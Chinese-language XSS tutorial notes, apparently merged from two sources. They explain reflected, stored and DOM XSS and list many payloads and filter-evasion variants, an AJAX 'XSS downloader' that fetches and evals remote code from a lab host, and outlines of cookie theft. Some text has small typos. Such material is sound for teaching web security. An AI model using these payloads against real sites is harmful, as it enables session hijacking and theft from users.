# XSS漏洞概述

## 简介

XSS作为OWASP TOP 10之一

XSS被作为跨站脚本攻击(Cross-site scripting),本来应该缩写为CSS，但是由于和CSS(Cascading Style Sheets,层叠样式脚本)重名，所以更名为XSS。XSS（跨站脚本攻击）主要基于javascript(JS)完成恶意的攻击行为。JS可以非常灵活的操作html、css和浏览器，这使得XSS攻击的“想象”空间特别大。

XSS通过将精心构造的代码(JS)代码注入到网页中，并由浏览器解释运行这段JS代码，以达到恶意攻击的效果。当用户访问被XSS脚本注入的网页，XSS脚本就会被提取出来。用户浏览器就会解析这段XSS代码，也就是说用户被攻击了。用户最简单的动作就是使用浏览器上网，并且浏览器中有javascript解释器，可以解析javascript，然而浏览器不会判断代码是否恶意。也就是说，XSS的对象是用户和浏览器。

XSS漏洞发生在哪里？
服务器

微博、留言板、聊天室等等收集用户输入的地方，都有可能被注入XSS代码，都存在遭受XSS的风险，只要没有对用户的输入进行严格过滤，就会被XSS。

- XSS危害

  XSS利用JS代码实现攻击，有很多种攻击方式，一下简单罗列几种
  @ 盗取各种用户账号
  @ 窃取用户Cookie资料，冒充用户身份进入网站
  @ 劫持用户会话，执行任意操作
  @ 刷流量、执行弹窗广告
  @ 传播蠕虫病毒
  等等

- 漏洞的验证

  我们可以用一段简单的代码，验证和检测漏洞的存在，这样的代码叫做PoX(Proof of Concept)。
  PoC 漏洞的验证与检测
  EXP 漏洞的完整利用
  shellcode  利用漏洞时，所执行的代码
  payload    攻击载荷
            sqlmap    攻击代码的模板
            msf       shellcode 类似，功能是建立与目标的连接 
  验证XSS漏洞存在的PoC如下
```
<script>alert(/xss/)</script>   常用
<script>confirm('xss')</script>
<script>prompt('xss')</script>
```

我们可以在测试页面中提交这样的代码[<script>alert(/xss/)</script>]

我们发现，提交的代码[<script>alert(/xss/)</script>],被当作字符串输出在HTML页面中，浏览器会根据[<script>]标签识别为JS语句，并会执行它，执行弹窗操作。也可以说，可以执行其他JS代码，因此我们验证了漏洞的存在性

## XSS的分类

XSS漏洞大概可以分为三个类型：反射型XSS、存储型XSS、DOM型XSS。

- 反射型XSS

反射型XSS是非持久性、参数型的跨站脚本。反射型XSS的JS代码在Web应用的参数（变量）中，如搜索框的反射型XSS。

在搜索框中，提交PoC[<script>alert(/xss/)</script>],点击搜索，即可触发反射型XSS。

注意到，我们提交的poc，会出现在search.php页面的keywords参数中。

- 存储型XSS

存储型XSS是持久性跨站脚本。持久性体现在XSS代码不是在某个参数（变量）中，而是写进数据库或文件等可以永久保存数据的介质中。

存储型XSS通常发生在留言板等地方。我们在留言板位置留言，将恶意代码写进数据库中。

此时，我们只是完成了第一步，将恶意代码写入数据库。因为XSS使用的JS代码，JS代码的运行环境是浏览器，所以需要浏览器从服务器载入恶意的XSS代码，才能真正触发XSS。此时，需要我们模拟网站后台管理员的身份，查看留言。

- DOM XSS

DOM XSS比较特殊。owasp关于DOM型号XSS的定义是基于DOM的XSS是一种XSS攻击，其中攻击的payload由于修改受害者浏览器页面的DOM树而执行的。其特殊的地方就是payload在浏览器本地修改DOM树而执行，并不会传到服务器上，这也就使得DOM XSS比较难以检测。如下面例子
[#message=<script>alert(/xss/)</script>]

我们以锚点的方式提交PoC。PoC并不会发送到服务器，但是已经触发了XSS。查看当前页面的源代码如下

## XSS的构造
- 利用[<>]构造HTML/JS
可以利用[<>]构造HTML标签和<script>标签
在测试页面提交参数[<h1 style='color:red'>利用[<>]构造HTML/JS</h1>]

提交[<script>alert(/xss/)</script>]

- 伪协议

也可以使用javascript:伪协议的方式构造XSS
[javascript:alert(/xss/);]
提交参数[<a href="javascript:alert(/xss/)">touch me!</a>],然后点击超链接，即可触发XSS

也可以使用img标签的伪协议，但是这种方法在IE6下测试成功。[<img src="javascript:alert('xss')">]

- 产生自己的事件

“事件驱动”是一种比较经典的编程思想。在网页中会发生很多事件（比如鼠标移动，键盘输入等），JS可以对这些事件进行响应。所以我们可以通过事件触发JS函数，触发XSS。

事件种类
windows事件            对windows对象触发的事件
Form事件               HTML表单内的动作触发事件
keyboard事件           键盘按键
Mouse事件              由鼠标或类似用户动作触发的事件
Media事件              由多媒体触发的事件

如，[<img src='./smile.jpg' onmouseover='alert(/xss/)'>]这个标签会引入一个图片，然后鼠标悬停在图片上的时候，会触发XSS代码。

单行文本框的键盘点击事件，[<input type="text" onkeydown="alert(/xss/)">],当点击键盘任意一个按键的时候出发。
<input type="text" onkeyup="alert(/xss/)">
<input type="button" onclick="alert(/xss/)">
[<img src='#' onerror='alert(/xss/)'>]

- 利用CSS跨站（old）

我们也可以利用CSS（层叠样式表）触发XSS。但是这种方法比较古老，基本上不适合现在主流的浏览器，但是从学习的角度，我们需要了解这种类型的XSS，以下代码均在IE6下测试

@ 行内样式
[<div style="background-image:url(javascript:alert(/xss/))">]

@ 页内样式
[<style>Body{background-image:url(javascript:alert(/xss/))}</style>]

@ 外部样式
[<link rel="stylesheet" type="text/css" href="./xss.css"><div>hello<div>]

- 其他标签以及手法(H5)
我们可以用其他标签触发XSS
[<svg onload="alert(/xss/)">] 这个语句还是比较简洁的

[<input onfocus=alert(/xss/) autofocus>]

## XSS的变形

我们可以构造XSS代码进行各种变形，以绕过XSS过滤器的检测。变形方式主要有以下几种

- 大小写转换

可以将payload进行大小写转换。如下面两个例子。
<Img sRc='#' Onerror="alert(/xss/)">

<a hREf="javaScript:alert(/xss/)">click me</a>

- 引号的使用

HTML语言中对引号的使用不敏感，但是某些过滤函数是“锱铢必较”。
<img src="#" onerror="alert(/xss/)"/>

<img src='#' onerror='alert(/xss/)'/>

<img src=# onerror=alert(/xss/)/>

- [/]代替空格

可以利用左斜线代替空格
<Img/sRc='#'/Onerror='alert(/xss/)'/>

- 回车

我们可以在一些位置添加Tab（水平制表符）和回车符，来绕过关键字检测。
<Img/sRc='#'/Onerror  ='alert(/xss/)' />

<A hREf="j
a vascript:alert(/xss/)">click me!</a>

- 对标签属性值进行转码

可以对标签属性值进行转码，用来绕过过滤。对应编码如下

字母     ASCII码       十进制编码        十六进制编码
a        97            &#97;             &#x61;
e        101           &#101;            &#x65;

经过简单编码之后的样子
<a hREf="j&#97;v&#x61;script:alert(/xss/)">click me!</a>

另外，我们可以将以下字符插入到任意位置
Tab      &#9
换行     &#10
回车     &#13

可以将以下字符插入到头部位置
SOH     &#01
STX     &#02

经过编码后的样子
<A hREf="&#01;j&#97;v&#x61;s&#9;c&#10;r&#13;ipt:alert(/xss/)">
click me!
</a>

- 拆分跨站

<script>z='alert'</script>
<script>z=z+'(/xss/)'</script>
<script>eval(z)</script>

- 双写绕过

```
<script>
<scr<script>ipt>
```

- CSS中的变形

@ 使用全角字符
width:e x p r e s s i o n(alert(/xss/))

@ 注释会被浏览器忽略
width:expr/*~*/ession(alert(/x~s~s/))

@ 样式表中的[\]和[\0]
<style>@import 'javasc\ri\0pt:alert("xss")';</style>

Shellcode的使用
  Shellcode就是在利用漏洞所执行的代码
  完整的XSS攻击，会将Shellcode存放在一定的地方，然后触发漏洞。调用Shellcode。

- 远程调用JS

可以将JS代码单独放在一个js文件中，然后通过http协议远程加载该脚本。如[<script src="http://127.0.0.1/XSS-TEST/normal/xss.js"></script>]，这是比较常用的方式。XSS。js的内容如下：
```
alert('xss.js');
```

- windows.location.hash

我们可以使用js中的windows。location.hash方法获取浏览器URL地址栏的XSS代码。

windows.location.hash 会获取URL中#后面的内容，例如[http://domain.com/index.php#AJEST]windows.location.hash的值就[#AJEST]

所以我们可以构造如下代码[?submit=submit&xsscode=<script>eval(location.hash.substr(1))</script>#alert(/This is windows.location.hash/)],直接提交到测试页面xss.php

- XSS Downloader

XSS下载器就是将XSS代码写到网页中，然后通过AJAX技术，取得网页中的XSS代码。
在使用XSS Downloader之前需要一个我们自己的页面，xss_downloader.php,内容如下
常见的下载器如下：
```
<script>
function XSS(){
  if (window.XMLHttpRequest) {
    a = new XMLHttpRequest();
  } else if (window.ActiveXObject) {
    a = new ActiveXObject("Microsoft.XMLHTTP");
  } else {return;}

  a.open('get','http://172.16.132.161/XSS-TEST/normal/xss_downloader.php',false);
  a.send();
  b=a.responseText;
  eval(unescape(b.substring(b.indexOf('BOF|')+4,b.indexOf('|EOF'))));
}
XSS();
</script>
```

AJAX技术会收到浏览器同源策略的限制，为了解决这个问题，我们需要再服务器端代码中添加如下内容。
```
<?php
header('Access-Control-Allow-Orign: *');
header('Access-Control-Allow-Headers:Origin,X-Requested-With,Content-Type, Accept');
```

- 备选存储技术

我们可以把Shellcode存储在客户端的本地域中，比如HTTP Cookie、Flash共享对象、UserData、localStorage等。

# 自动化XSS

BeEF

# 认识xss

xss(cross-site script)跨站脚本自1996年诞生以来，一直被OWASP(open web application security project)评为十大安全漏洞中的第二威胁漏洞。也有黑客把xss当做新型的“缓冲区溢出攻击”，而JavaScript是新型的shellcode

2011年6月份，国内最火的信息发布平台“新浪微博”爆发了xss蠕虫攻击，仅持续16分钟，感染用户近33000个，危害十分严重
xss最大的特点就是能注入恶意的代码到用户浏览器的网页上，从而达到劫持用户会话的目的

# 什么是跨站脚本

是一种经常出现在web应用程序中的计算机安全漏洞，是由于web应用程序对用户的输入过滤不严而产生的。攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采用cookie资料窃取，会话劫持，钓鱼欺骗等攻击手段

# xss的危害

1 网络钓鱼。包括盗取各类的用户账号
2 窃取用户cookie
  窃取用户浏览会话
  强制弹出广告页面、刷流量
  网页挂马
  提升用户权限，进一步渗透网站
  传播跨站脚本蠕虫等

# JavaScript简介

JavaScript一种直译式语言，是一种动态类型、弱类型、基于原型的语言，内置支持类型。它的解释器被称为JavaScript引擎，为浏览器的一部分，广泛用于客户端的脚本语言，最早是在HTML（标准通用标记语言下的一个应用）网页上使用，用来给HTML网页增加动态功能

在1995年时，由Netscape公司的Brendan Eich，在网景导航者浏览器上首次设计实现而成。因为Netscape与Sun合作，Netscape管理层希望它外观看起来像Java，因此取名为JavaScript。但实际上它的语法风格与Self及Schema较为接近

为了取得技术优势，微软推出了JScript，CEnvi推出了ScriptEase，与JavaScript同样可在浏览器上运行。为了统一规格，因为JavaScript兼容于ECMA标准，因此也成为ECMAScript

## docunment对象

document是一个对象，从JS一开始就存在的一个对象，它代表当前的页面（文档）
我们调用它的write()方法就能够向该对象中写入内容

即： document.write()
可以在html引用外部js代码
<script src=x.js></script>
js代码中写入
document.write("hello cracer");

## JavaScipt变量

## JavaScript流程控制

if-else控制语句
switch控制语句
for循环
while循环

## javascipt函数

function x(a,b){
  var c=a+b;
  return c;
}

## javascript事件

onclick属性 点击事件
function x(){
  alert(/xss/)
}
<h1 onclick="x()">hello</h1>

# XSS分类

反射型XSS
DOM型XSS
存储型XSS

## 反射型XSS

反射型跨站脚本也称作非持久型、参数型跨站脚本、这类型的脚本是最常见的，也是使用最为广泛的一种，主要用于将恶意的脚本附加到URL地址的参数中
例如
http://www.cracer.com/search.php?key="><script>alert("xss")</script>

一般使用的将构造好的URL发给受害者，是受害者点击触发，而且只执行一次，非持久化
DOM型XSS

## 存储型XSS

存储型XSS比反射型跨站脚本更具有威胁性，并且可能影响到web服务器的自身安全

此类xss不需要用户点击特定的URL就能执行跨站脚本，攻击者事先讲恶意JavaScript代码上传或存储到漏洞服务器中，只要受害者浏览包含此恶意的代码的页面就会执行恶意代码

### 火狐中常用的XSS调试插件

Hackbar
Firebug
Tamper Data
Live HTTP Headers
Editor Cookie

### XSS漏洞挖掘

挖掘方法：
  手工挖掘
  工具挖掘

### 工具挖掘XSS漏洞

awvs
netsparke
appscan
burp
xsser
xsscrapy
brutexssr
OWASP Xenotix

## 常见的防xss代码

$x=preg_replace("/script/","",$x);
$x=preg_replace("/script/i","",$x);
$x=preg_replace("/alert/i","",$x);
$x=preg_replace("/script/i","",$x);

## XSS绕过限制

相信大家在做渗透测试的时候都有过这样的经历，明明一个xss的漏洞，但是却有xss过滤规则或者WAF保护导致我们不能成功利用，比如我们输入<script>alert("hi")</script>，会被转换为<script>alert(>xss detected<)</script>,这样的话我们的xss就不生效了
几种简单的绕过xss的方法：
1. 绕过magic_quotes_gpc
2. 编码                   复杂的关键字过滤
3. 改变大小写              简单的关键字过滤
4. 关闭标签

<script>alert('xss')</script>

### 绕过magic_quotes_gpc

magic_quotes_gpc=ON是php中的安全设置，开启后会把一些特殊字符进行轮换，比如'(单引号)转换为\',"(双引号)转换为\",\转换为\\

比如：<script>alert("xss");</script>会转换为<script>alert(\"xss\");</script>,这样我们的xss就不生效了

针对开启了magic_quotes_gpc的网站，我们可以通过javascript中的String.fromCharCode方法来绕过，我们可以把alert("XSS");转换为String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41)那么我们的XSS语句就变成了
<script>String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41,59)</script>
String.fromCharCode(0是javascript中的字符串方法，用来把ASCII转换为字符串)

### 编码 可以对语句进行hex编码来绕过XSS规则

### 改变大小写

在测试过程中，我们可以改变测试语句的大小写来绕过XSS规则

### 闭合标签

有时我们需要关闭标签来使我们的XSS生效

### 解决限制字符（要求同页面）

### COOKIE获取

反射型XSS的cookie获取
存储型XSS的cookie获取
http-only启用时获取cookie
编写接收cookie代码

